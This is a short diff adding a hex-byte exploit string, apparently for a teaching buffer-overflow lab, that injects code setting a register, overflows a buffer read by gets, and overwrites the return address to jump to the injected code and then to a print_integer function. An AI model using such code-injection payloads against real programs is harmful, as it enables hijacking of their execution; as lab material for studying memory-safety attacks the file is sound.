@@ -1,0 +1,18 @@
+/* mov $0x14,%rdi */
+48 c7 c7 14 00 00 00
+/* add $0x35,%rdi */
+48 83 c7 35
+/* ret */
+c3
+/* newline, to end the fgets call that uses global buffer */
+0a
+/* gets uses the local buffer, and we'll overflow it */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* exploit code's address */
+80 10 60 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
+/* print_integer's address */
+60 06 40 00 00 00 00 00   /* don't forget byte-reversal for little-endian */
